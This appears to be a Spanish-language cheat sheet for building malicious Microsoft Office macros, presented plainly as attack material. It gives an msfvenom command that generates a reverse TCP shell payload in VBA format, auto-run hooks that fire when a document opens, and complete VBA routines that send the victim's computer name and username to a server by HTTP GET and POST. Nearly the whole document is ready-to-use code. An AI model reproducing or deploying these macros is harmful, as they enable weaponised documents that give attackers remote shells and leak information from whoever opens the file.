# Visual Basic Office

## msfvenom 

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.123.51 LPORT=4444 EXITFUNC=thread -f vbapplication
```

## Ejecutar macro al abrir

```vb
Sub Document_Open()
    Macro
End Sub

Sub AutoOpen()
    Macro
End Sub
```

## Enviar datos por GET y POST

Envia datos por macro el nombre del equipo y el usuario por una peticion GET y POST

### GET

```vb
Sub EnviarSolicitudGETPrincipal()
    ' Llamamos al subprocedimiento y pasamos los parámetros
    Dim respuesta As String
    respuesta = EnviarSolicitudGET("localhost", Environ("COMPUTERNAME"), Environ("USERNAME"))
    
    ' Mostramos la respuesta recibida en una ventana de mensaje
    MsgBox "Respuesta del servidor:" & vbCrLf & respuesta
End Sub

Function EnviarSolicitudGET(ByVal host As String, ByVal equipo As String, ByVal usuario As String) As String
    Dim url As String
    Dim request As Object
    Dim response As String

    ' Construir la URL con los parámetros
    url = "http://" & host & "/?equipo=" & equipo & "&usuario=" & usuario

    ' Crear una instancia de la clase MSXML2.XMLHTTP para hacer la solicitud HTTP
    Set request = CreateObject("MSXML2.XMLHTTP")

    ' Hacer la solicitud GET
    request.Open "GET", url, False
    request.send

    ' Obtener la respuesta del servidor
    response = request.responseText

    ' Devolver la respuesta como una cadena
    EnviarSolicitudGET = response
End Function
```

### POST

```vb
Sub EnviarSolicitudPOSTPrincipal()
    ' Llamamos al subprocedimiento y pasamos los parámetros
    Dim respuesta As String
    respuesta = EnviarSolicitudPOST("localhost", Environ("COMPUTERNAME"), Environ("USERNAME"))
    
    ' Mostramos la respuesta recibida en una ventana de mensaje
    MsgBox "Respuesta del servidor:" & vbCrLf & respuesta
End Sub

Function EnviarSolicitudPOST(ByVal host As String, ByVal equipo As String, ByVal usuario As String) As String
    Dim url As String
    Dim request As Object
    Dim response As String
    Dim postData As String

    ' Construir la URL
    url = "http://" & host

    ' Construir los datos a enviar en el cuerpo de la solicitud POST
    postData = "equipo=" & equipo & "&usuario=" & usuario

    ' Crear una instancia de la clase MSXML2.XMLHTTP para hacer la solicitud HTTP
    Set request = CreateObject("MSXML2.XMLHTTP")

    ' Hacer la solicitud POST
    request.Open "POST", url, False
    request.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    request.send postData

    ' Obtener la respuesta del servidor
    response = request.responseText

    ' Devolver la respuesta como una cadena
    EnviarSolicitudPOST = response
End Function
```